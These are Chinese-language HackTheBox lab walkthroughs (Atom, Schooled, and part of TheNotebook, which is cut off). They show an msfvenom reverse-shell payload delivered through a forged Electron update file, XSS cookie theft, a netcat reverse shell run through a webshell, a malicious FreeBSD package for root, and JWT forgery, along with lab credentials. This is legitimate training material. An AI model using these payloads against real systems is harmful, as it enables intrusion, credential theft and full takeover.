Gobuster\n既然都添加了，那目录爆破和子域名爆破就不能少了，爆破吧\n\ngobuster爆破目录\n\n```cpp\ngobuster dir -u \"http://10.10.10.237/\" -x php,txt,html -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt\n```\n![](Hackthebox-Atom/02f0988b-a3f0-487b-b4b5-85e6ca5ad2f5.png)\n\ngobuster爆破DNS\n\n```cpp\ngobuster dns -d 'atom.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\n```\n![](Hackthebox-Atom/3e914921-9098-4971-9530-038745e49625.png)\n\n简单爆破了一下，好像都没啥有用的东西，那咱们只能去下载了\n\n![](Hackthebox-Atom/bee2234d-5d40-4422-b748-83dc6bfe7758.png)\n\n![](Hackthebox-Atom/72b012ad-49ae-4978-8d51-ffbffd41ce08.png)\n\n下载下来后是一个exe程序，这就不得不切换一台windows的机器出来了\n\n![](Hackthebox-Atom/fbc8b7f2-2ab1-4bd8-86fe-be406a76db43.png)\n\n安装好后是酱婶儿的\n\n![](Hackthebox-Atom/935136a5-9fcc-4ff5-aecd-f0c5a057538d.png)\n\n![](Hackthebox-Atom/0b0cdabc-3dd8-4fe7-9710-c21c76ba44fe.png)\n\n这告诉我们这是一个电子应用程序\n\n![](Hackthebox-Atom/ed184c95-5181-47a7-951d-b65e26dcc45b.png)\n\n通过Googles搜索rce程序\n\n![](Hackthebox-Atom/2a62ebef-89ac-46c2-a711-95141cc37718.png)\n\n> [https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html](https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html)\n\n![](Hackthebox-Atom/8c6b16d3-bc66-41ea-938a-d35f473483a2.png)\n\nJuliano Rizzo 这里提到了是由这位大佬发现的漏洞，感谢\n\n![](Hackthebox-Atom/9c8742ef-a0cb-453e-9809-185ae8092dda.png)\n\n![](Hackthebox-Atom/a52b4aef-6929-454c-9a29-f842ad7d9bb8.png)\n\n这里说它将从latest.yml进行更新\n\n# **漏洞利用**\n首先我们生成带有单引号的有效负载\n\n```cpp\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.184 LPORT=4444 -f exe > \"u'payload.exe\"\n```\n![](Hackthebox-Atom/6157165b-d499-4087-bc6f-a16bbfed85d1.png)\n\n现在我们需要生成一个 sha512 sum hash 并将其转换为十六进制，然后进一步转换为base64\n\n```cpp\nshasum -a 512 \"u'payload.exe\" | cut -d \" \" -f1 | xxd -r -p | base64\n```\n![](Hackthebox-Atom/d7215416-bdc3-43b9-88f0-a3bd339e9d1c.png)\n\n```cpp\nkPA7kwD6QtUcXqDkwnQacg7ZUWGSBiz4oTaWQuxceC7t8SRYcq5T6CBmujUbrHhMVKLJ+RftvSkmpXGFJ1cCMg==\n```\n创建latest.yml文件\n\n```cpp\nversion: 1.0.1\npath: http://10.10.14.184/u'payload.exe\nsha512: kPA7kwD6QtUcXqDkwnQacg7ZUWGSBiz4oTaWQuxceC7t8SRYcq5T6CBmujUbrHhMVKLJ+RftvSkmpXGFJ1cCMg==\n```\n![](Hackthebox-Atom/eef83432-f347-48b4-8634-50056cb1dbd9.png)\n\n使用python3开启一个http服务器\n\n```cpp\npython3 -m http.server 80\n```\n![](Hackthebox-Atom/61216e59-103e-4f74-8ca4-562b5b22a224.png)\n\n替换掉smb共享中的yml文件\n\n![](Hackthebox-Atom/15bcce74-cf7b-4fbb-9ab0-8932fa5363aa.png)\n\n![](Hackthebox-Atom/4e36ec59-bb2c-4354-9cdc-c2818cf78045.png)\n\n![](Hackthebox-Atom/e1caef27-db98-4aac-a3d1-9a46d2ef2a46.png)\n\n三个文件夹都要替换\n\n```cpp\nuse exploit/multi/handler\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\n```\n使用msfconsole开启监听\n\n![](Hackthebox-Atom/854cf26a-9bbc-4ee6-aeab-f62894aac05d.png)\n\n配置好配置项后exploit执行\n\n![](Hackthebox-Atom/9d859e61-0515-4fa3-8468-0b5fd3a21de6.png)\n\n我们可以看到 http服务器里已经收到了GET请求\n\n然后我们再去看看MSF\n\n![](Hackthebox-Atom/a6ae1e69-e7cb-4cb4-b652-89de16390776.png)\n\n已经成功getshell了\n\n如果没有弹回shell，就多尝试几次，或使用1.2.3版本号\n\n# **权限提升**\n![](Hackthebox-Atom/f0f5f382-388e-462b-a13f-82423a387176.png)\n\n为了提权，我先输入了getprivs查看当前用户的权限\n\n输入shell进入shell控制\n\n![](Hackthebox-Atom/de95ab75-3203-4f11-b667-153dea67ad1c.png)\n\n首先进入Program Files目录\n\n![](Hackthebox-Atom/9082084a-87a0-471a-a677-81b82f07f72c.png)\n\n然后进入Redis目录\n\n![](Hackthebox-Atom/75ee9e81-f1cd-4218-ad6c-f21f29e4c7f8.png)\n\n然后我们看到redis的配置文件 redis.windows-service.conf\n\n![](Hackthebox-Atom/e924337d-64f8-496a-b583-b2c40b2b9e58.png)\n\n我们可以看到，里面有redis cli的密码kidvscat\\_yes\\_kidvscat\n\n![](Hackthebox-Atom/d1a7f259-5a46-4991-ab72-8b8fa1173dfc.png)\n\n然后咱们发现这台靶机的6379端口 也就是redis服务开着呢，那就直接登录吧\n\n![](Hackthebox-Atom/a066ecf7-4788-4aba-8928-eba943d62062.png)\n\n登录成功，并使用info进行信息查看\n\n使用keys \\*列出所有hash\n\n![](Hackthebox-Atom/a6e357b5-a45e-4f96-954a-866299be7e5d.png)\n\ne8e29158-d70d-44b1-a1ba-4949d52790a0\n\n查看user用户的相关信息\n\nget pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0\n\n![](Hackthebox-Atom/34b65aae-b69a-4d26-bfc2-210a88b1e460.png)\n\n我们得到了一个管理员的hash\n\nOdh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi\n\n![](Hackthebox-Atom/799d353d-1433-4c65-a925-613a39f269fa.png)\n\n同时我们在用户jason的桌面发现了一个user.txt\n\n成功拿到user权限的flag\n\n![](Hackthebox-Atom/e2e8800b-c412-498f-975e-12a7e53614a8.png)\n\n在检查其他文件的时候，找到了两个文件夹，咱们进去看看\n\n![](Hackthebox-Atom/49bda4c4-0f12-40b4-adc6-4e9fb4d65843.png)\n\n这里似乎没什么有用的东西，咱们看看另一个文件夹\n\n![](Hackthebox-Atom/f8a3f043-81bf-4df9-b3f3-60994ae1d8ed.png)\n\n这个程序引起了我的兴趣，然后去Google了一下\n\n> [https://www.exploit-db.com/exploits/49409](https://www.exploit-db.com/exploits/49409)\n\n然后找到了一个exp\n\n![](Hackthebox-Atom/1c6f36a8-2ce4-4c33-8fa6-d59f7001fee6.png)\n\n![](Hackthebox-Atom/7035a9a4-b916-4f12-a2c5-19bdcecbfb0b.png)\n\n可能。。。这就是缘分吧？\n\n![](Hackthebox-Atom/5a78abb7-ac35-4f0b-912b-6838642dff2a.png)\n\n咱们查看一下配置文件Portablekanban.cfg\n\n获得了portablekanban的hash值\n\nOdh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb\n\n这时候开动我们机灵的小脑瓜，动起我们勤劳的小手，小小的修改一下exp\n\n```cpp\nimport json\nimport base64\nfrom des import * #python3 -m pip install des\nimport sys\n\ndef decode(hash):\nhash = base64.b64decode(hash.encode('utf-8'))\nkey = DesKey(b\"7ly6UznJ\")\nreturn key.decrypt(hash,initial=b\"XuVUm5fR\",padding=True).decode('utf-8')\nprint(decode('Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi'))\n```\n![](Hackthebox-Atom/4538043d-86b4-4f9a-9c95-2a5538bb127a.png)\n\n执行一下这个脚本\n\n![](Hackthebox-Atom/5a78848e-2539-43eb-8160-41b16bab2a67.png)\n\n成功得到Administrator的密码kidvscat\\_admin\\_@123\n\n![](Hackthebox-Atom/58206c5f-6b3f-4e44-a467-add1442634ff.png)\n\n我们可以看到5985端口是开启的\n\n别问我怎么知道，因为思路卡壳的我，想了一晚上\n\nNB吗？用头发换的\n\n经过Google，我们发现5985端口是WinRM程序使用的端口\n\n那咱们就根据文档来利用吧\n\n注意，在kali中安装winrm的指令是\n\n```cpp\ngem install evil-winrm\n```\n安装好后使用evil-winrm进行登录\n\n```cpp\nevil-winrm -i 10.10.10.237 -u 'administrator' -p 'kidvscat_admin_@123'\n```\n![](Hackthebox-Atom/6c83bbff-2a3c-4a69-8be2-4f57872ec033.png)\n\n![](Hackthebox-Atom/f35152b2-72e4-4b20-88b4-fc6d5bfed0cf.png)\n\n成功拿到root权限的flag\n\n收工睡觉","tags":["Hackthebox"]},{"title":"Schooled - Hackthebox","url":"/2021/06/04/Hackthebox/Medium/Hackthebox-Schooled/","content":"\n# Hackthebox - Schooled\n**Hackthebox - Schooled 靶场实战**\n\n**靶场信息**\n\n![](Hackthebox-Schooled/d39530b7-cc49-4a2a-881d-27b0de066ee5.png)\n\n**靶场类型**\n\n![](Hackthebox-Schooled/14bd35f9-5215-4445-b811-48684af89ae3.png)\n\n**信息搜集**\n\n首先使用nmap进行端口扫描\n\nnmap -A -sS -sC -sV 10.10.10.234\n\n![](Hackthebox-Schooled/4b6210f3-812b-4dd8-b932-60c45fa56586.png)\n\n我们可以看到，这台靶机开启了22和80端口，咱们的目光依然放到80端口上\n\n首先访问一下80端口的http服务\n\n![](Hackthebox-Schooled/38713f2f-f8cd-4a0b-9637-fec76fb25729.png)\n\n在底部看到一个schooled.htb，那估计是要解析了，咱们直接先加上吧\n\n![](Hackthebox-Schooled/d8c7782a-c3ae-47e0-92a9-d6ce1db72dc8.png)\n\n在手动浏览以及dirb目录爆破的时候，都没有在web页面中找到啥有趣的东西\n\n咱们结合一下上面看到的提示有一个schooled.htb域名以后，突然来了思路\n\n这不就跟咱们做的Love那一台差不多吗？都是得从子域名入手\n\n所以这个时候使用wfuzz工具进行fuzz\n\n![](Hackthebox-Schooled/af3d48f7-193a-4b93-afb9-c9bf1348025d.png)\n\n咱们这里发现有很多461行的相应，这明显是不对的，咱们把461行的相应屏蔽掉\n\nwfuzz -c -u \"http://schooled.htb/\" -H \"Host:FUZZ.schooled.htb\" -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt --hl 461\n\n![](Hackthebox-Schooled/126204fd-c62e-47e4-8066-617f4501c5ba.png)\n\n咱们找到一个moodle子域名\n\n![](Hackthebox-Schooled/133b0ba6-5bf6-4052-85a0-e907e052a146.png)\n\n咱们先修改一下hosts解析\n\n去访问一下http://moodle.schooled.htb/\n\n![](Hackthebox-Schooled/94458eb6-308b-4e5b-8125-dcf1259331ee.png)\n\n在这里咱们找到了几个老师的名字\n\n数学老师：Jamie Borham\n\n科学老师：Lianne Carter\n\n信息技术：Jane Higgins\n\n英语老师：Manuel Phillips\n\n然后除了老师的名字和找到了登陆点以外，就没什么有意思的东西了\n\n![](Hackthebox-Schooled/71384630-852e-4156-bc16-333f3f7306eb.png)\n\n咱们首先创建个账号，错误有点多，咱们挨个解决\n\n![](Hackthebox-Schooled/e91ad2f4-dca8-4131-84f8-3804167b3204.png)\n\n可算是注册好了，还挺麻烦\n\n![](Hackthebox-Schooled/57965eeb-ebd3-4ab9-ab80-6ec8209be1a7.png)\n\n随便浏览了一下，发现我们只能报数学课（吐槽一下垃圾抢课系统，还好我不用）\n\n![](Hackthebox-Schooled/27c8d185-edcf-4272-b8ba-32a20cb80ba1.png)\n\n![](Hackthebox-Schooled/9aceb5cc-7163-4cc2-9dd6-13cf99e10864.png)\n\n我们还能看到老师的简介\n\n![](Hackthebox-Schooled/4ed15734-2642-43e4-be9c-28d0cdbc7677.png)\n\n我们发现老师有发布一条帖子，我用我的小学三年级靠个位数的天才英语给大家翻译一下\n\n大概意思就是，这是一门自学课程（要老师干啥？），参加我（这位老师）课程的学生，确保设置好了MoodleNet个人资料。没设置的开始课程以后，会被踢出这门课程，老师会挨个儿查看报名该课程的学生\n\n各位在座的盲生，发现了华点没有？\n\nNice，突破点就在老师表示会挨个检查我们的资料，这不就是确定100%会点击我们的资料了吗？那想到了什么？没错！XSS！\n\n![](Hackthebox-Schooled/d407f65e-f1eb-41f8-97a5-997a600d93b0.png)\n\n![](Hackthebox-Schooled/67761736-b769-4a18-9ca9-ed22995e5f80.png)\n\n咱们修改好以后，可以看到老师上线了\n\n![](Hackthebox-Schooled/2cf355d5-fc35-4dc1-b561-b48059719e4c.png)\n\n![](Hackthebox-Schooled/312ca8d0-a28f-43f5-988c-e87b00891424.png)\n\n哎嘿，经过测试，聊天框是可以用xss的\n\n但却是一个反射型xss（国内某平台都不收的垃圾洞，吐槽一下），但是咱们证明了该网站是存在XSS的。结合我们之前的猜测，应该是在MoodleNet处插入xss\n\n**漏洞利用**\n\n[https://github.com/s0wr0b1ndef/WebHacking101/blob/master/xss-reflected-steal-cookie.md](https://github.com/s0wr0b1ndef/WebHacking101/blob/master/xss-reflected-steal-cookie.md)\n\n这是我使用的xss cookie脚本，大家有习惯使用的也可以用自己的\n\n![](Hackthebox-Schooled/bde7fe4c-dd43-4111-afaf-e8199bdaf8cc.png)\n\n咱们修改好脚本后使用python启动\n\n![image](x)\n\n然后在MoodleNet处插入我们的xss代码\n\n![](Hackthebox-Schooled/02f8e3b9-ee40-4287-bee6-efa8e14a86e2.png)\n\n咱们插入后保存，可以看到自己的cookie已经过来了，咱们挂着去听会儿音乐，老师的cookie就过来\n\n![](Hackthebox-Schooled/37dea52c-561d-4849-8419-fe5da39744dd.png)\n\n好了，咱们已经成功钓到老师的cookie了\n\n![](Hackthebox-Schooled/92f68d71-562b-48e9-8c63-5848b936a3c2.png)\n\n将咱们的cookie替换为老师的cookie\n\n然后刷新\n\n![](Hackthebox-Schooled/65c577a0-9531-4461-951d-9e5a376f4958.png)\n\n可以看到，已经成功进入老师的权限了\n\n[https://moodle.org/mod/forum/discuss.php?d=407393](https://moodle.org/mod/forum/discuss.php?d=407393)\n\n我们在查找漏洞的时候，发现了这个CVE-2020-14321。\n\n课程中的教师可以把自己的身份更改为经理，也就是越权\n\n![](Hackthebox-Schooled/cf55e5b6-711c-4819-aa58-54b6a52f423d.png)\n\n现在我们来进行又一次的越权吧\n\n![](Hackthebox-Schooled/85cb796a-416b-48e4-97d9-11ca3b99bdec.png)\n\n![](Hackthebox-Schooled/3083db84-2069-48ef-8f75-9ba3d252f08a.png)\n\n随便选择一个人，然后抓包，然后提交\n\n![](Hackthebox-Schooled/7f955fcd-2886-41f0-a7c2-450b84a89782.png)\n\n成功抓到包了\n\n![](Hackthebox-Schooled/afd585cd-87c1-4409-8e9a-1909372e1b3d.png)\n\n咱们在介绍页面，发现Lianne Carter是一名经理，OK 那就越她\n\nuserlist改为24，因为咱们也是越权到老师的账号，所以要修改为老师的ID，而24就是老师的ID，roletoassign处是记录的权限，1为经理，咱们修改为1以后点击send\n\n![](Hackthebox-Schooled/ad74b9d1-b8d7-4fbd-953e-9c938fa993b3.png)\n\n![](Hackthebox-Schooled/2b80dd5a-42fe-4852-8e5a-07b80918283b.png)\n\n刷新以后，咱们可以看到，权限已经变成了经理\n\n![](Hackthebox-Schooled/306c6761-f580-4c8a-ad84-302eb08ea3dd.png)\n\n然后把Lianne Carter添加到学生里，这样我们就能看到 Lianne Carter了。\n\n我之前就是没添加，在这卡了好久，靶机重置了三次\n\n咱们点击Lianne Carter并登入该账号\n\n![](Hackthebox-Schooled/1b894f52-2138-4bf1-8919-357633b20ebe.png)\n\n咱们点击登录\n\n![](Hackthebox-Schooled/b494f6eb-d725-4e32-90e6-9cb8b973d377.png)\n\n然后咱们在最底下可以看到site administration\n\n咱们点击\n\n接下来咱们按照RCE里的套路跟着走就行\n\n![](Hackthebox-Schooled/018bbc57-4afc-41d8-8be0-ec805297c0c1.png)\n\n![](Hackthebox-Schooled/17248339-827c-4372-b9f0-58494d8e8d3a.png)\n\n![](Hackthebox-Schooled/1e45fb52-091e-4d7a-8235-6168e65e5939.png)\n\n![](Hackthebox-Schooled/36891a7e-f280-45a8-8db2-235a7b6080f0.png)\n\n咱们在点save changes之前，记得抓包\n\n![](Hackthebox-Schooled/e9d2317e-a0eb-4e41-a658-a033a3850e99.png)\n\n然后替换RCE里的包\n\n![](Hackthebox-Schooled/522a7c45-c003-4259-8cc0-4e4b7b2eef7c.png)\n\n看来RCE执行成功了\n\n![](Hackthebox-Schooled/ab2ee190-3475-4b51-ac1d-9a72309c3e18.png)\n\n上传咱们的EXP\n\n![](Hackthebox-Schooled/428e65a8-ec7e-488a-a841-168a956deea4.png)\n\n![](Hackthebox-Schooled/712d8ffb-ffa1-4503-8195-ec5d49dcd3a2.png)\n\n![](Hackthebox-Schooled/56396b95-64b2-40ec-a521-e3f40002f6e0.png)\n\n访问http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block\\_rce.php?cmd=id\n\n成功拿到一个webshell\n\n本地使用nc监听端口\n\nnc -nvlp 4444\n\n执行nc反弹shell\n\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i |nc 10.10.14.184 4444 > /tmp/f\n\n[http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block\\_rce.php?cmd=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%20|nc%2010.10.14.184%204444%20%3E%20/tmp/f](http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%20|nc%2010.10.14.184%204444%20%3E%20/tmp/f)\n\n![](Hackthebox-Schooled/54e892c1-f6a2-4869-8795-bde02069101b.png)\n\n成功使用nc反弹shell\n\n**权限提升**\n\n![](Hackthebox-Schooled/98a28b9c-453e-4c76-8b75-3083b661eb22.png)\n\n咱们使用pwd查看一下当前位置，发现是在apache目录下\n\n也就是说，咱们拥有apache目录的权限\n\n那就直接读取apache的配置文件吧\n\n首先查找配置文件地址\n\nfind / -name \"config.php\" 2>dev/null\n\ncat /usr/local/www/apache24/data/moodel/config.php\n\n然后使用cat查看配置文件\n\n![](Hackthebox-Schooled/07520677-34e6-4439-8047-65f491b405a1.png)\n\n我发现这么做好像有一点问题，咱们去修改一下RCE\n\n![](Hackthebox-Schooled/11ae4920-38b9-46bb-82b7-078e936e29d3.png)\n\n[https://github.com/LucifielHack/phpbash](https://github.com/LucifielHack/phpbash)\n\n咱们将里面的一句话木马修改为phpbash\n\n![](Hackthebox-Schooled/d87e8c3c-8fe3-463c-88fb-37fbfad314dd.png)\n\n成功得到账号密码\n\ndbname = model\n\ndbuser = model\n\ndbpass = PlaybookMaster2020\n\n![](Hackthebox-Schooled/63a5da2e-2b69-47e1-92ce-6f368c39746f.png)\n\n我想使用mysql进行登录，但输入mysql后发现无法使用？\n\n但上面已经看到了，使用了mysqli进行连接，那就肯定是存在mysql的。\n\n但是为什么无法使用呢？我想应该是path里没有配置，咱们使用export查看一下\n\n![](Hackthebox-Schooled/68a29e0e-8272-434d-beac-09fc81af7f1c.png)\n\n果然没有\n\n然后我找了一下mysql的路径，咱们使用绝对路径来进行读取\n\n/usr/local/bin/mysql -u moodle -pPlaybookMaster2020 -e \"use moodle;select \\* from mdl\\_user\\\\G\"\n\n![](Hackthebox-Schooled/7995e9e5-b636-4422-943a-143875230af9.png)\n\n$2y$10\\$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW\n\n其中咱们需要关注的是Jamie的密码hash，为什么呢？因为在/etc/passwd里也有他\n\n![](Hackthebox-Schooled/486029da-7607-4ca8-99d5-d7c8d1b4b895.png)\n\n既然咱们拿到一个hash了，那么就请出咱们的老朋友 john\n\n![](Hackthebox-Schooled/4cb05695-3769-4251-84df-28c0403c3caf.png)\n\n爆破成功\n\n密码为 !QAZ2wsx\n\n咱们去登录\n\nssh [jamie@10.10.10.234](mailto:jamie@10.10.10.234)\n\n![](Hackthebox-Schooled/874cff83-bd98-4246-b082-505a99adb7d6.png)\n\n成功登录\n\n![](Hackthebox-Schooled/11bb12a5-a207-416d-8e6d-d1ae0f61bef6.png)\n\n成功拿到user权限flag\n\n咱们使用sudo -l查看一下sudo权限\n\n![](Hackthebox-Schooled/a997420b-d6e2-4e29-bb9c-0781bcf9fda7.png)\n\n可以sudo权限安装pkg包\n\n那不用说，提权思路肯定在这了\n\n[http://lastsummer.de/creating-custom-packages-on-freebsd/](http://lastsummer.de/creating-custom-packages-on-freebsd/)\n\n找到一篇参考文章，接下来咱们构造EXP包\n\n#!/bin/sh\n\nSTAGEDIR=\\~/stage\n\nrm -rf \\${STAGEDIR}\n\nmkdir -p \\${STAGEDIR}\n\ncat >> \\${STAGEDIR}/+PRE\\_DEINSTALL <<EOF\n\n# careful here, this may clobber your system\necho \"Resetting root shell\"\n\npw usermod -n root -s /bin/sh\n\nEOF\n\ncat >> \\${STAGEDIR}/+POST\\_INSTALL <<EOF\n\n# careful here, this may clobber your system\necho \"Registering root shell\"\n\nchmod +s /usr/local/bin/bash\n\nEOF\n\ncat >> \\${STAGEDIR}/+MANIFEST <<EOF\n\nname: mypackage\n\nversion: \"1.0\\_5\"\n\norigin: sysutils/mypackage\n\ncomment: \"automates stuff\"\n\ndesc: \"automates tasks which can also be undone later\"\n\nmaintainer: john@doe.it\n\nwww: https://doe.it\n\nprefix: /\n\nEOF\n\nmkdir -p \\${STAGEDIR}/usr/local/etc\n\necho \"# hello world\" > \\${STAGEDIR}/usr/local/etc/my.conf\n\necho \"/usr/local/etc/my.conf\" > \\${STAGEDIR}/plist\n\npkg create -m ${STAGEDIR}/ -r${STAGEDIR}/ -p \\${STAGEDIR}/plist -o .\n\n![](Hackthebox-Schooled/7739097e-276e-4625-ab1d-c3f53d9335cc.png)\n\npython3 -m http.server 80\n\n![](Hackthebox-Schooled/4b11b773-31c9-49fe-8ddd-d198fde97ee0.png)\n\n在本地开启一个http服务\n\n然后在服务器上用wget下。。。\n\n![](Hackthebox-Schooled/62a0e49a-eabe-4645-8c8b-a087f7d8cdc2.png)\n\n嗯？卧槽？失策了，居然没有wget\n\n测试了一下，vim也没有，但是有vi和nano\n\n看大家喜欢用那个，反正直接创建就好了\n\n创建好后记得添加执行权限\n\nchmod +x exploit.sh\n\n![](Hackthebox-Schooled/9e8706b6-ccd9-4f17-930c-9cc9f6658243.png)\n\n然后我们安装它\n\nsudo /usr/sbin/pkg install --no-repo-update mypackage-1.0\\_5.txz\n\n![](Hackthebox-Schooled/778332c2-581e-458f-a540-d9f4f20661f0.png)\n\n![](Hackthebox-Schooled/4d3b1319-76cc-450f-8ebb-be5be2e5780a.png)\n\n然后咱们使用SUID来攻击\n\nbash -p\n\n![](Hackthebox-Schooled/97058f9b-4d26-4732-8cd2-fcf91b8103fc.png)\n\n成功提权到root\n\n![](Hackthebox-Schooled/8d844f11-d4d3-498f-b3f3-575f290a1c2c.png)\n\n成功获得root权限的flag\n\n收工睡觉","tags":["Hackthebox"]},{"title":"TheNotebook - Hackthebox","url":"/2021/06/03/Hackthebox/Medium/Hackthebox-TheNotebook/","content":"\n# Hackthebox - TheNotebook\n**靶场信息**\n\n![](Hackthebox-TheNotebook/2f2eae2f-bb41-451a-a415-7087d6deee49.png)\n\n**靶场类型**\n\n![](Hackthebox-TheNotebook/939ecfab-775b-477f-aff1-2f4fa861891d.png)\n\n**信息搜集**\n\n首先使用nmap进行端口扫描\n\nnmap -A -sS -sC -sV 10.10.10.230\n\n![](Hackthebox-TheNotebook/702fb2de-4379-43fb-b066-a0d19f78f6d1.png)\n\n我们可以看到，一共有三个端口22 80 10010，其中10010目前是关闭状态，所以咱们的突破口还是在80端口\n\n![](Hackthebox-TheNotebook/fc236a57-b44e-4787-a3d6-5286dad22c42.png)\n\n进去后只有三个按钮 Home、Register、Login\n\nHome就是主页，所以咱们先创建一个账号试试\n\n![](Hackthebox-TheNotebook/7ae5d39d-39ce-48a3-99b9-e4f695be28dc.png)\n\n注册了一个名为Lucifiel的账号，提示我们在/notes下可以查看到笔记，咱们先去看看\n\n![](Hackthebox-TheNotebook/f6817e63-57ec-454b-8d48-60f516c24467.png)\n\n目前没有笔记，那就创建一个看看吧\n\n![](Hackthebox-TheNotebook/f4ab18a1-3c5f-404c-b822-3503e62aa66a.png)\n\n![](Hackthebox-TheNotebook/3a8f2463-a24e-432b-b535-f4712dd2b003.png)\n\n嗯。。。暂时没什么可利用的，咱们来看看能不能找到管理员账号吧\n\n先退出登录，然后登录的时候咱们测试一下\n\n账号admin\n\n![](Hackthebox-TheNotebook/4d2cc6ca-70ff-46ed-b01a-bbf4677cfee5.png)\n\n提示密码错误\n\n账号admin1\n\n![](Hackthebox-TheNotebook/b69bc147-0c8c-435e-9fc5-b3435e26b4ab.png)\n\n提示账户不存在\n\n嗯。。。确定了admin账户存在，但是在使用top1000进行爆破后，并没有爆破出密码\n\n**漏洞利用**\n\n咱们登入刚才注册的Lucifiel账号，然后看看cookie\n\n![](Hackthebox-TheNotebook/145d5347-8cbc-4434-8992-7bfe135e2d6a.png)\n\n咱们可以看到auth下有三段base64的字段\n\n咱们使用CyberChef进行解密，会发现第三段是乱码，咱们就解密前两段就好了\n\n![](Hackthebox-TheNotebook/e55f4243-96e4-4a83-9af4-23bf743e8890.png)\n\n{\"typ\":\"JWT\",\"alg\":\"RS256\",\"kid\":\"http://localhost:7070/privKey.key\"}\n\n{\"username\":\"Lucifiel\",\"email\":\"Lucifiel@email.com\",\"admin\\_cap\":false}\n\n解密出来的内容，我们会发现，上面有一个JWT，我感觉这是突破口\n\n[https://jwt.io/introduction](https://jwt.io/introduction)\n\n直接搜索JWT 找到了一个官网并且有相关的介绍，我们发现JWT是一个JSON 网络令牌\n\n![](Hackthebox-TheNotebook/36fffcd3-9096-47e5-b7b2-64e05e40b99d.png)\n\nJWT格式\n\nheaders.payload.signature\n\n这就是咱们的突破口了，可算是找到了\n\n漏洞利用\n\n由于Headers和Payload是明文储存的，所以咱们先把这两项修改好\n\n![](Hackthebox-TheNotebook/517c99cf-27e9-4429-b0d7-7f82171703b6.png)\n\nHeaders = {\"typ\":\"JWT\",\"alg\":\"RS256\",\"kid\":\"http://10.10.14.184/privKey.key\"}\n\nPayload = {\"username\":\"Lucifiel\",\"email\":\"Lucifiel@email.com\",\"admin\\_cap\":1}\n\n但是这里的signature也就是密钥却是加密的，咱们无法修改也无法读取，怎么办呢？当然是Google啦\n\n[https://gist.github.com/ygotthilf/baa58da5c3dd1f69fae9](https://gist.github.com/ygotthilf/baa58da5c3dd1f69fae9)\n\nssh-keygen -t rsa -b 2048 -m PEM -f privKey.key\n\n# Don't add passphrase\nopenssl rsa -in privKey.key -pubout -outform PEM -out privKey.key.pub\n\ncat privKey.key\n\ncat privKey.key.pub\n\n经过Google搜索JWT密钥的生成放式，咱们找到了所需的命令\n\nkali里生成\n\n![](Hackthebox-TheNotebook/a593014c-f63d-472f-9b98-e362d5d076cb.png)\n\n这就是咱们要的密钥了\n\n* \\----BEGIN PUBLIC KEY-----\n\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnwiGXuFO1peifvmt2y08\n\nU89mLgcwp+jxcXkp0/qURF2N9ZqnIYp/Jp6HuGJcqeeoJT/DprtAJsCs6hWJ2Fdq\n\nnSPGs63Ig6OqGJQK/dH2vt6EzQaXqRmkCeN9jwTTPmMr5xklcCtmBAGq8h4NY5LN\n\nPcB9GHudFyi8U/Ae2f/ED8koR/AyG1ZdC6SvMv3tjOmkJ5Cax+jbGJMtUGEj4Xfa\n\nNa5kJxDSq8F4Z16/I+4IO7/cfQlVOMNZ09tvEjOAUxjaD8YkueIvyOHeIXhmEY7/\n\nDF/Tkoh7fpRt+9AWEbASZi/p2m+DF9Ws/K8MyXqNjpWhLrRDpeVLuOLd33V2BQ2w\n\nRwIDAQAB\n\n* \\----END PUBLIC KEY-----\n\n咱们将headers和payload和进行base64，并且保存为JWT需要的格式headers.payload.signature\n\neyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4xODQvcHJpdktleS5rZXkifQ.eyJ1c2VybmFtZSI6Ikx1Y2lmaWVsIiwiZW1haWwiOiJMdWNpZmllbEBlbWFpbC5jb20iLCJhZG1pbl9jYXAiOjF9.Q0kirAQPuqVJLtkhAa0pkrB11Dy0-tDm-8H9b3HDja7VWPc4mIiupMYzUzxAZamlA1xnUA\\_x1Btx4N7lcc09GdXZ0o9Ma-q\\_j-mPu2V-iFJ5hoYSZdL91bjqGMxp-oJ38pSMW4ulJzssuiRa6wl\\_C-8n9P4i6T0gqvLQjRUr8ksaLoM1WvU4SRjRN6EH\\_oFY\\_P9rTGilC2Vt1uogZ0UZGikDmXRXy74rH\\_-Bvkx8JcFgLgM5D4xPa5ayKFJ-jF-0vazUB8oUeKMr5za1vCbJXSBSNSosQ1MhkacUkEMnOllWNgYilbZR9t1p05vUnaT7ntbsYbILxb6fk4hVU1LyYA\n\n脚本：\n\nimport jwt\n\nkey = open(\"privKey.key.pub\", 'r').read()\n\nheaders = {\"typ\": \"JWT\", \"alg\": \"RS256\", \"kid\": \"http://10.10.14.184/privKey.key\"}\n\npayload = {\"username\": \"Lucifiel\", \"email\": \"Lucifiel@email.com\", \"admin\\_cap\": 1}\n\nprint(jwt.encode(payload, headers=headers, key=key, algorithm='RS256'))\n\n使用该脚本即可生成我们所需要的cookie\n\n在咱们本地使用python3开启一个http服务器\n\npython3 -m http.server 80\n\n然后修改10.10.10.230靶场的cookie，然后刷新\n\n![](Hackthebox-TheNotebook/730868bd-9a0f-42ae-ae68-6dcf8929514a.png)\n\n咱们可以看到，成功越权，然后出现了一个按钮 admin panel 